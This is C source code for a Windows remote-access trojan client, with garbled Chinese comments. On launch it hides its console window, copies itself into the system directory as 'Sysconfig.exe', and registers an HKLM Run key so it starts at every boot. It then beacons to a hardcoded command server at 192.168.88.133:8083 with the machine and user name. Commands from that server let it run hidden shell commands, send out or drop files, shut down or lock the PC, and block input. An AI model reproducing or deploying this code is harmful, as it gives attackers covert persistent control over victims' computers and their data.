#include <stdio.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>
#include <winable.h>
#pragma comment(lib, "ws2_32.lib")


#ifdef _MSC_VER  
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )  
#endif

#define MSG_LEN 1024
#define MSG_LENN 5120


int ServerPort = 8083;  //���ӵĶ˿�
char ServerAddr[] = "192.168.88.133"; //�������ӵ�����
int CaptureImage(HWND hWnd, CHAR *dirPath, CHAR *filename);


// �����ļ�
int sendFile(SOCKET client, char *filename) 
{		
    char sendbuf[1024];
    DWORD        dwRead;  
    BOOL         bRet;
	Sleep(200);

    HANDLE hFile=CreateFile(filename,GENERIC_READ,0,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
	if(hFile==INVALID_HANDLE_VALUE) {
		return 1;
	}
    while(1) {  //�����ļ���buf
        bRet=ReadFile(hFile,sendbuf,1024,&dwRead,NULL);
        if(bRet==FALSE) break;
        else if(dwRead==0) {
			Sleep(100);
            break;  
        } else {  
            send(client,sendbuf,dwRead,0);
        }  
    }
	send(client,"EOFYY",strlen("EOFYY")+1,0);
    CloseHandle(hFile);
	if (strcmp(filename,"screen.jpg")==0) {
		system("del screen.jpg");
	}
	
	return 0;
}

// �����ļ�
int recvFile(SOCKET client, char *filename) 
{
	int len;
    char recvBuf[1024] = {0};   // ������
    HANDLE hFile;               // �ļ����
    DWORD count;                // д������ݼ���
 
    hFile = CreateFile(filename, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_ARCHIVE, NULL);
	if(hFile==INVALID_HANDLE_VALUE) {
		return 1;
	}
	send(client,"BEGIN",6,0);
    while (1) {
        // �ӿͻ��˶�����
		ZeroMemory(recvBuf, sizeof(recvBuf));   
		len = recv(client, recvBuf, 1024, 0);
        if (strlen(recvBuf) < 5) {
            if (strcmp(recvBuf, "EOF") == 0) {
                CloseHandle(hFile);
                break;
            }
		}
        WriteFile(hFile,recvBuf,len,&count,0);
    }
	Sleep(500);
	send(client,"RECV",5,0);
	return 0;
}

// ִ��CMD����ܵ�����
int cmd(char *cmdStr, char *message)
{
    DWORD readByte = 0;
    char command[1024] = {0};
    char buf[MSG_LENN] = {0}; //������
 
    HANDLE hRead, hWrite;
    STARTUPINFO si;         // ����������Ϣ
    PROCESS_INFORMATION pi; // ������Ϣ
    SECURITY_ATTRIBUTES sa; // �ܵ���ȫ����
 
    // ���ùܵ���ȫ����
    sa.nLength = sizeof( sa );
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;
 
    // ���������ܵ����ܵ�����ǿɱ��̳е�
	if( !CreatePipe(&hRead, &hWrite, &sa, MSG_LENN)) {
        return 1;
    }
 
    // ���� cmd ������Ϣ
    ZeroMemory( &si, sizeof( si ) );
    si.cb = sizeof( si ); // ��ȡ���ݴ�С
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; // ��׼�����ʹ�ö����
    si.wShowWindow = SW_HIDE;               // ���ش�������
    si.hStdOutput = si.hStdError = hWrite;  // ������ʹ�����ָ��ܵ�д��һͷ

	// ƴ�� cmd ����
	sprintf(command, "cmd.exe /c %s", cmdStr);
 
    // �����ӽ���,��������,�ӽ����ǿɼ̳е�
    if ( !CreateProcess( NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi )) {
        CloseHandle( hRead );
        CloseHandle( hWrite );
		printf("error!");
        return 1;
    }
    CloseHandle( hWrite );
  
    //��ȡ�ܵ���read��,���cmd���
    while (ReadFile( hRead, buf, MSG_LENN, &readByte, NULL )) {
        strcat(message, buf);
        ZeroMemory( buf, MSG_LENN );
    }
    CloseHandle( hRead );

    return 0;
}


void c_socket() 
{

	// ��ʼ�� Winsock
	WSADATA wsaData;
	struct hostent *host;
	struct in_addr addr;

	int iResult = WSAStartup( MAKEWORD(2,2), &wsaData );
	if ( iResult != NO_ERROR ) {
			//printf("Error at WSAStartup()\n");
	}
	while(1){

		//����������ַ
		host = gethostbyname(ServerAddr);
		if( host == NULL ) {
			Sleep(20000);
			continue;
		}else{
			addr.s_addr = *(unsigned long * )host->h_addr;
			break;
		}
	}

	// ����socket socket.
	SOCKET client;
	client = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
	if ( client == INVALID_SOCKET ) {
		printf( "Error at socket(): %ld\n", WSAGetLastError() );
		WSACleanup();
		return;
	}

	//��ȡ���������û���
	char userName[20]={0};
	char comName[20]={0};
	char comInfo[40]={0};
	DWORD nameLen = 20;
	DWORD comLen = 20;
	GetUserName(userName,&nameLen);
	GetComputerName(comName,&comLen);
	sprintf(comInfo, "%s#%s", comName, userName);

	// ���ӵ�������.
	sockaddr_in clientService;
	clientService.sin_family = AF_INET;
	//clientService.sin_addr.s_addr = inet_addr("10.0.0.4");
	clientService.sin_addr.s_addr = inet_addr(inet_ntoa(addr));
	clientService.sin_port = htons(ServerPort);
	while(1){
		if ( connect( client, (SOCKADDR*) &clientService, sizeof(clientService) ) == SOCKET_ERROR) {
			//printf( "\nFailed to connect.\nWait 10s...\n" );
			Sleep(20000);
			continue;
		}else {
			send(client,comInfo, 40, 0);
			break;
		}
	}

	//�����ȴ������ָ��
	char recvCmd[MSG_LEN] = {0};
	char message[MSG_LENN+10] = {0};
	while(1) {
		ZeroMemory(recvCmd, sizeof(recvCmd));
		ZeroMemory(message,sizeof(message));

		//�ӷ���˻�ȡ����
        recv(client, recvCmd, MSG_LEN, 0);
		if(strlen(recvCmd)<1){  //SOCKET�ж�����
			closesocket(client);
			while(1){
				client = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
				if ( connect( client, (SOCKADDR*) &clientService, sizeof(clientService) ) == SOCKET_ERROR) {
					//printf( "\nFailed to connect.\nWait 10s...\n" );
					Sleep(20000);
					continue;
				}else {
					send(client,comInfo, 40, 0);
					break;
				}
			}
			continue;
		}else if(strcmp(recvCmd,"shutdown")==0){  //�ػ�
			system("shutdown -s -t 1");
			continue;
		}else if(strcmp(recvCmd,"reboot")==0){  //����
			system("shutdown -r -t 10");
			continue;
		}else if(strcmp(recvCmd,"cancel")==0){  //ȡ���ػ�
			system("shutdown -a");
			continue;
		}else if(strcmp(recvCmd,"kill-client")==0){  //�رտͻ���
			send(client,"Client has exit!", 18, 0);
			exit(0);
		}else if((recvCmd[0]=='$') || (recvCmd[0]=='@')){
			int i;
			char c;
			char CMD[30]={0};
			for(i = 1;(c = recvCmd[i])!= '\0';i ++) {
				CMD[i-1] = recvCmd[i];
			}
			if(recvCmd[0] == '$') {  //ִ������ָ��
				if(! cmd(CMD,message)) send(client, message, strlen(message)+1, 0);
				else send(client,"CMD Error!\n",13,0);
			}else {  //����
				MessageBox(NULL,CMD,"Windows Message",MB_OK|MB_ICONWARNING);
			}
			continue;
		}else if(strcmp(recvCmd,"lock")==0){ //����
			system("%windir%\\system32\\rundll32.exe user32.dll,LockWorkStation");
			continue;
		}else if(strcmp(recvCmd,"blockinput")==0){ //�������ͼ���
			BlockInput(true);
			Sleep(5000);
			BlockInput(false);
			continue;
		}else if(strcmp(recvCmd,"mouse")==0){ //���ù��
			SetCursorPos(0,0);
			continue;
		}else if(strcmp(recvCmd,"download")==0){ //�ϴ��ļ�
			ZeroMemory(recvCmd, sizeof(recvCmd));
			recv(client, recvCmd, MSG_LEN, 0);
			if(sendFile(client,recvCmd)) {
				send(client,"EOFNN",strlen("EOFNN")+1,0);
			}
			continue;
		}else if(strcmp(recvCmd,"upload")==0){ //�����ļ�
			ZeroMemory(recvCmd, sizeof(recvCmd));
			recv(client, recvCmd, MSG_LEN, 0);
			if(recvFile(client,recvCmd)){
				send(client,"ERRO", 5, 0);
			}
			continue;
		}else{
			continue;
		}
	}
	WSACleanup();
    return;
}

//������
int copySelf(char *path)
{
	char fileName[MAX_PATH];
	char sysPath[MAX_PATH];
	GetModuleFileName(NULL,fileName, sizeof(fileName));
	GetSystemDirectory(sysPath, sizeof(sysPath));
	sprintf(path,"%s\\Sysconfig.exe",sysPath);
	CopyFile(fileName, path, TRUE);

	return 0;
}

int autoRun(char *path)
{
    HKEY hKey;
    DWORD result;
 
    //��ע���
    result = RegOpenKeyEx(
        HKEY_LOCAL_MACHINE,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run", // Ҫ�򿪵�ע���������
        0,              // �������������� 0
        KEY_SET_VALUE,  // ��Ȩ�ޣ�д��
        &hKey           // ��֮��ľ��
    );

    if (result != ERROR_SUCCESS) return 0;

    // ��ע���������(û���������һ��ֵ)
    result = RegSetValueEx(
                 hKey,
                 "SystemConfig", // ����
                 0,                  // �������������� 0
                 REG_SZ,             // ��ֵ����Ϊ�ַ���
                 (const unsigned char *)path, // �ַ����׵�ַ
                 strlen(path)        // �ַ�������
             );

    if (result != ERROR_SUCCESS) return 0;
 
    //�ر�ע���:
    RegCloseKey(hKey);

    return 0;
}

int main()
{
	char path[MAX_PATH];

	copySelf(path);
	autoRun(path);
	c_socket();

	return 0;
}